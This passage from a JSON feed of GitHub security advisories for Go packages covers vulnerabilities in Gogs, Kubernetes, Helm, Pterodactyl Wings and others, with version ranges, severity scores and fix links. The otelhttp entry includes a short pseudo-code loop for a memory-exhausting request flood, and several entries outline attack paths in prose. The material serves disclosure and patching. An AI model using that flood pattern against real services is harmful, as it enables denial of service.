"https://github.com/anchore/syft/security/advisories/GHSA-jp7v-3587-2956"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-24827"}, {"type": "WEB", "url": "https://github.com/anchore/syft/commit/9995950c70e849f9921919faffbfcf46401f71f3"}, {"type": "PACKAGE", "url": "https://github.com/anchore/syft"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T21:38:46Z", "nvd_published_at": "2023-02-07T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p7wj-c85f-xq9h", "modified": "2023-02-16T21:52:22Z", "published": "2023-02-08T09:30:24Z", "aliases": ["CVE-2023-0741"], "summary": "Answer has Cross-site Scripting vulnerability", "details": "Cross-site Scripting (XSS) - DOM in GitHub repository answerdev/answer prior to 1.0.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0741"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/c3001de52af91f09c96e701facbce0b9fa0c98ad"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/78233bfa-871d-45e1-815f-dee73e397809"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:36:22Z", "nvd_published_at": "2023-02-08T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pfvh-p8qp-9ww9", "modified": "2023-03-09T15:31:59Z", "published": "2023-02-28T20:12:11Z", "aliases": ["CVE-2022-2024"], "summary": "Gogs OS Command Injection vulnerability", "details": "### Impact\n\nThe malicious user is able to update a crafted `config` file into repository's `.git` directory in combination with crafted file deletion to gain SSH access to the server on case-insensitive file systems. All installations with [repository upload enabled (default)](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129) on case-insensitive file systems (Windows, macOS, etc.) are affected.\n\n### Patches\n\nMake sanitization of upload path to `.git` directory to be case-insensitive. Users should upgrade to 0.12.11 or the latest 0.13.0+dev.\n\n### Workarounds\n\nDisable [repository upload](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129).\n\n### References\n\nhttps://huntr.dev/bounties/18cf9256-23ab-4098-a769-85f8da130f97/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/7030.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-pfvh-p8qp-9ww9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2024"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/7030"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/15d0d6a94be0098a8227b6b95bdf2daed105ec41"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129"}, {"type": "WEB", "url": "https://huntr.dev/bounties/18cf9256-23ab-4098-a769-85f8da130f97"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-28T20:12:11Z", "nvd_published_at": "2023-02-25T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8mjg-8c8g-6h85", "modified": "2023-08-30T10:44:16Z", "published": "2023-02-06T23:27:00Z", "aliases": ["CVE-2020-8564"], "summary": "Kubernetes Sensitive Information leak via Log File", "details": "In Kubernetes clusters using a logging level of at least 4, processing a malformed docker config file will result in the contents of the docker config file being leaked, which can include pull secrets or other registry credentials. This affects < v1.19.3, < v1.18.10, < v1.17.13.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.19.0"}, {"fixed": "1.19.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.18.0"}, {"fixed": "1.18.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.17.13"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.20.0-alpha.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8564"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/95622"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/94712"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/11793434dac97a49bfed0150b56ac63e5dc34634"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-discuss/c/vm-HcrFUOCs/m/36utxAM5CwAJ"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0066"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20210122-0006/"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-06T23:27:00Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-66p8-j459-rq63", "modified": "2023-02-10T23:11:01Z", "published": "2023-02-10T23:11:01Z", "aliases": ["CVE-2023-25168"], "summary": "Pterodactyl Wings contains UNIX Symbolic Link (Symlink) Following resulting in deletion of files and directories on the host system", "details": "### Impact\n\nThis vulnerability impacts anyone running the affected versions of Wings.  The vulnerability can be used to delete files and directories recursively on the host system.  This vulnerability can be combined with [`GHSA-p8r3-83r8-jwj5`](https://github.com/pterodactyl/wings/security/advisories/GHSA-p8r3-83r8-jwj5) to overwrite files on the host system.\n\nIn order to use this exploit, an attacker must have an existing \"server\" allocated and controlled by Wings.  Information on how the exploitation of this vulnerability works will be released on February 24th, 2023 in North America.\n\n### Patches\n\nThis vulnerability has been resolved in version `v1.11.4` of Wings, and has been back-ported to the 1.7 release series in `v1.7.4`.\n\nAnyone running `v1.11.x` should upgrade to `v1.11.4` and anyone running `v1.7.x` should upgrade to `v1.7.4`.\n\n### Workarounds\n\nNone at this time.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pterodactyl/wings/security/advisories/GHSA-66p8-j459-rq63"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/security/advisories/GHSA-p8r3-83r8-jwj5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25168"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/commit/429ac62dba22997a278bc709df5ac00a5a25d83d"}, {"type": "PACKAGE", "url": "https://github.com/pterodactyl/wings"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-10T23:11:01Z", "nvd_published_at": "2023-02-09T00:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pwcw-6f5g-gxf8", "modified": "2023-02-08T22:36:51Z", "published": "2023-02-08T22:36:51Z", "aliases": ["CVE-2023-25165"], "summary": "Helm vulnerable to information disclosure via getHostByName Function ", "details": "A Helm contributor discovered an information disclosure vulnerability using the `getHostByName` template function.\n\n### Impact\n\n`getHostByName` is a Helm template function introduced in Helm v3. The function is able to accept a hostname and return an IP address for that hostname. To get the IP address the function performs a DNS lookup. The DNS lookup happens when used with `helm install|upgrade|template` or when the Helm SDK is used to render a chart.\n\nInformation passed into the chart can be disclosed to the DNS servers used to lookup the IP address. For example, a malicious chart could inject `getHostByName` into a chart in order to disclose values to a malicious DNS server.\n\n### Patches\n\nThe issue has been fixed in Helm 3.11.1.\n\n### Workarounds\n\nPrior to using a chart with Helm verify the `getHostByName` function is not being used in a template to disclose any information you do not want passed to DNS servers.\n\n### For more information\n\nHelm's security policy is spelled out in detail in our [SECURITY](https://github.com/helm/community/blob/master/SECURITY.md) document.\n\n### Credits\n\nDisclosed by Philipp Stehle at SAP.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.11.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-pwcw-6f5g-gxf8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25165"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/293b50c65d4d56187cd4e2f390f0ada46b4c4737"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/5abcf74227bfe8e5a3dbf105fe62e7b12deb58d2"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1547"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:36:51Z", "nvd_published_at": "2023-02-08T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9w8x-5hv5-r6gw", "modified": "2023-04-04T21:45:28Z", "published": "2023-02-15T06:30:26Z", "aliases": ["CVE-2022-25978"], "summary": "Cross Site Scripting in usememos/memos", "details": "All versions of the package github.com/usememos/memos/server prior to 0.11.0 are vulnerable to Cross-site Scripting (XSS) due to insufficient checks on external resources, which allows malicious actors to introduce links starting with a javascript: scheme.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.4-0.20230211093429-b11d2130a084"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25978"}, {"type": "WEB", "url": "https://github.com/usememos/memos/issues/1026"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/b11d2130a084385eb65c3761a3c841ebe9f81ae8"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1566"}, {"type": "WEB", "url": "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUSEMEMOSMEMOSSERVER-3319070"}, {"type": "PACKAGE", "url": "github.com/usememos/memos"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-15T18:16:31Z", "nvd_published_at": "2023-02-15T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p8r3-83r8-jwj5", "modified": "2023-02-08T22:40:37Z", "published": "2023-02-08T18:19:56Z", "aliases": ["CVE-2023-25152"], "summary": "Pterodactyl Wings contains UNIX Symbolic Link (Symlink) Following", "details": "### Impact\n\nThis vulnerability impacts anyone running the affected versions of Wings.  The vulnerability can be used to create new files and on the host system that previously did not exist, potentially allowing attackers to change their resource allocations, promote their containers to privileged mode, or potentially add ssh authorized keys to allow the attacker access to a remote shell on the target machine.\n\nIn order to use this exploit, an attacker must have an existing \"server\" allocated and controlled by Wings.  Information on how the exploitation of this vulnerability works will be released on February 24th, 2023 in North America.\n\n### Patches\n\nThis vulnerability has been resolved in version `v1.11.3` of Wings, and has been back-ported to the 1.7 release series in `v1.7.3`.\n\nAnyone running `v1.11.x` should upgrade to `v1.11.3` and anyone running `v1.7.x` should upgrade to `v1.7.3`.\n\n### Workarounds\n\nNone at this time.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pterodactyl/wings/security/advisories/GHSA-p8r3-83r8-jwj5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25152"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/commit/dac9685298c3c1c49b3109fa4241aa88272b9f14"}, {"type": "PACKAGE", "url": "https://github.com/pterodactyl/wings"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/releases/tag/v1.11.3"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/releases/tag/v1.7.3"}], "database_specific": {"cwe_ids": ["CWE-59", "CWE-61"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T18:19:56Z", "nvd_published_at": "2023-02-08T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jpxj-2jvg-6jv9", "modified": "2023-02-16T23:34:17Z", "published": "2023-02-16T21:30:28Z", "aliases": ["CVE-2023-0475"], "summary": "Data Amplification in HashiCorp go-getter", "details": "HashiCorp go-getter up to 1.6.2 and 2.1.1 is vulnerable to decompression bombs. Fixed in 1.7.0 and 2.2.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0475"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/0edab85348271c843782993345b07b1ac98912e6"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/78e6721a2a76266718dc92c3c03c1571dffdefdc"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-4-go-getter-vulnerable-to-denial-of-service-via-malicious-compressed-archive/50125"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/go-getter"}], "database_specific": {"cwe_ids": ["CWE-409"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-16T23:34:17Z", "nvd_published_at": "2023-02-16T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5r5m-65gx-7vrh", "modified": "2023-06-13T23:47:42Z", "published": "2023-02-08T22:32:16Z", "aliases": ["CVE-2023-25151"], "summary": "otelhttp and otelbeego have DoS vulnerability for high cardinality metrics", "details": "### Impact\n\nThe [v0.38.0](https://github.com/open-telemetry/opentelemetry-go-contrib/releases/tag/v1.13.0) release of [`go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp`](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/463c2e7cd69d25f40b0a595b05394eeb26c68ae2/instrumentation/net/http/otelhttp/handler.go#L218) uses the [`httpconv.ServerRequest`](https://github.com/open-telemetry/opentelemetry-go/blob/v1.12.0/semconv/internal/v2/http.go#L159) function to annotate metric measurements for the `http.server.request_content_length`, `http.server.response_content_length`, and `http.server.duration` instruments.\n\nThe `ServerRequest` function sets the `http.target` attribute value to be the whole request URI (including the query string)[^1]. The metric instruments do not \"forget\" previous measurement attributes when `cumulative` temporality is used, this means the cardinality of the measurements allocated is directly correlated with the unique URIs handled. If the query string is constantly random, this will result in a constant increase in memory allocation that can be used in a denial-of-service attack.\n\nPseudo-attack:\n```\nfor infinite loop {\n  r := generate_random_string()\n  do_http_request(\"/some/path?random=\"+r)\n}\n```\n\n### Patches\n- `go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp` - v0.39.0\n- `go.opentelemetry.io/contrib/instrumentation/github.com/astaxie/beego/otelbeego` - v0.39.0\n\n[^1]: https://github.com/open-telemetry/opentelemetry-go/blob/6cb5718eaaed5c408c3bf4ad1aecee5c20ccdaa9/semconv/internal/v2/http.go#L202-L208", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.38.0"}, {"fixed": "0.39.0"}]}]}, {"package": {"ecosystem": "Go", "name": "go.opentelemetry.io/contrib/instrumentation/github.com/astaxie/beego/otelbeego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.38.0"}, {"fixed": "0.39.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25151"}, {"type": "PACKAGE", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go/blob/v1.12.0/semconv/internal/v2/http.go#L159"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:32:16Z", "nvd_published_at": "2023-02-08T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5vx9-j5cw-47vq", "modified": "2023-03-01T01:35:47Z", "published": "2023-02-17T18:30:24Z", "aliases": ["CVE-2021-32163"], "summary": "Privilege escalation in MOSN", "details": "Authentication vulnerability in MOSN before v.0.23.0 allows attacker to escalate privileges via case-sensitive JWT authorization.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "mosn.io/mosn"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.23.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32163"}, {"type": "WEB", "url": "https://github.com/mosn/mosn/issues/1633"}, {"type": "WEB", "url": "https://github.com/mosn/mosn/pull/1637"}, {"type": "PACKAGE", "url": "https://github.com/mosn/mosn"}], "database_specific": {"cwe_ids": ["CWE-178", "CWE-863"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-17T20:47:37Z", "nvd_published_at": "2023-02-17T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q264-w97q-q778", "modified": "2023-05-10T17:20:51Z", "published": "2023-02-10T23:08:06Z", "aliases": ["CVE-2023-23625"], "summary": "Denial of service via HAMT Decoding Panics", "details": "### Impact\nTrying to read malformed HAMT sharded directories can cause panics and virtual memory leaks.\nIf you are reading untrusted user input, an attacker can then trigger a panic.\n\nThis is caused by bogus `fanout` parameter in the HAMT directory nodes.\nThis include checks returned in [ipfs/go-bitfield GHSA-2h6c-j3gf-xp9r](https://github.com/ipfs/go-bitfield/security/advisories/GHSA-2h6c-j3gf-xp9r), as well as limiting the `fanout` to `<= 1024` (to avoid attempts of arbitrary sized allocations).\n\n### Patches\n- https://github.com/ipfs/go-unixfs/commit/dbcc43ec3e2db0d01e8d80c55040bba3cf22cb4b\n\n### Workarounds\nDo not feed untrusted user data to the decoding functions.\n\n### References\n- https://github.com/ipfs/go-bitfield/security/advisories/GHSA-2h6c-j3gf-xp9r\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-unixfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-unixfs/security/advisories/GHSA-q264-w97q-q778"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-23625"}, {"type": "WEB", "url": "https://github.com/ipfs/go-unixfs/commit/467d139a640ecee4f2e74643dafcc58bb3b54175"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-q264-w97q-q778"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/go-unixfs"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1557"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-10T23:08:06Z", "nvd_published_at": "2023-02-09T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-33m6-q9v5-62r7", "modified": "2023-02-07T22:57:53Z", "published": "2023-02-07T22:57:53Z", "aliases": ["CVE-2021-3538"], "summary": "github.com/satori/go.uuid has Predictable SIF UUID Identifiers", "details": "### Impact\n\nThe siftool new command produces predictable UUID identifiers due to insecure randomness in the version of the `github.com/satori/go.uuid` module used as a dependency.\n\n### Patches\n\nA patch is available in version >= v1.2.1-0.20180404165556-75cca531ea76 of the module. Users are encouraged to upgrade.\n\nFixed by https://github.com/hpcng/sif/pull/90\n\n### Workarounds\n\nUsers passing CreateInfo struct should ensure the ID field is generated using a version of github.com/satori/go.uuid that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:\n\n`go get -u github.com/satori/go.uuid@v1.2.1-0.20180404165556-75cca531ea76`\n\n### References\n\nhttps://github.com/satori/go.uuid/issues/73\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/hpcng/sif/issues", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/satori/go.uuid"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.1-0.20180103161547-0ef6afb2f6cd"}, {"fixed": "1.2.1-0.20180404165556-75cca531ea76"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/apptainer/sif/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.1-0.20180103161547-0ef6afb2f6cd"}, {"fixed": "1.2.1-0.20180404165556-75cca531ea76"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3538"}, {"type": "WEB", "url": "https://github.com/satori/go.uuid/issues/73"}, {"type": "WEB", "url": "https://github.com/satori/go.uuid/pull/75"}, {"type": "WEB", "url": "https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1954376"}, {"type": "PACKAGE", "url": "https://github.com/satori/go.uuid"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0244"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488"}], "database_specific": {"cwe_ids": ["CWE-338"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:57:53Z", "nvd_published_at": "2021-06-02T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9xm8-8qvc-vw3p", "modified": "2023-02-07T22:41:28Z", "published": "2023-02-07T22:41:28Z", "aliases": ["CVE-2020-29242"], "summary": "Denial of Service in dhowden/tag", "details": "dhowden tag before 0.0.0-20201120070457-d52dcb253c63 allows `panic: runtime error: index out of range` via readPICFrame.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dhowden/tag"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20201120070457-d52dcb253c63"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29242"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/issues/77"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/issues/78"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/issues/79"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/issues/80"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/4b595ed4fac79f467594aa92f8953f90f817116e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/6b18201aa5c5535511802ddfb4e4117686b4866d"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/a92213460e4838490ce3066ef11dc823cdc1740e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/d52dcb253c63a153632bfee5f269dd411dcd8e96"}, {"type": "PACKAGE", "url": "https://github.com/dhowden/tag"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0097"}], "database_specific": {"cwe_ids": ["CWE-129"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:41:28Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-54q4-74p3-mgcw", "modified": "2023-02-23T22:31:36Z", "published": "2023-02-16T00:30:27Z", "aliases": ["CVE-2022-38867"], "summary": "rttys SQL Injection vulnerability", "details": "SQL Injection vulnerability in rttys versions 4.0.0, 4.0.1, and 4.0.2 in api.go, allows attackers to execute arbitrary code.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zhaojh329/rttys"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "4.0.0"}, {"last_affected": "4.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-38867"}, {"type": "WEB", "url": "https://github.com/zhaojh329/rttys/issues/117"}, {"type": "PACKAGE", "url": "https://github.com/zhaojh329/rttys"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-23T22:31:36Z", "nvd_published_at": "2023-02-15T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6cvf-m58q-h9wf", "modified": "2023-03-06T19:36:19Z", "published": "2023-02-21T15:30:23Z", "aliases": ["CVE-2023-0934"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.5.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0934"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/edc06942d51fa8e56a134c5c7e5c8826d9260da0"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/cd213098-5bab-487f-82c7-13698ad43b51"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-22T00:09:37Z", "nvd_published_at": "2023-02-21T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8cfg-vx93-jvxw", "modified": "2023-09-18T21:20:19Z", "published": "2023-02-06T23:27:56Z", "aliases": ["CVE-2020-8565"], "summary": "Kubernetes client-go vulnerable to Sensitive Information Leak via Log File", "details": "In Kubernetes, if the logging level is set to at least 9, authorization and bearer tokens will be written to log files. This can occur both in API server logs and client tool output like kubectl. This affects <= v1.19.5, <= v1.18.13, <= v1.17.15, < v1.20.0-alpha2.", "severity": [{"type": "CVSS_V3", "score": 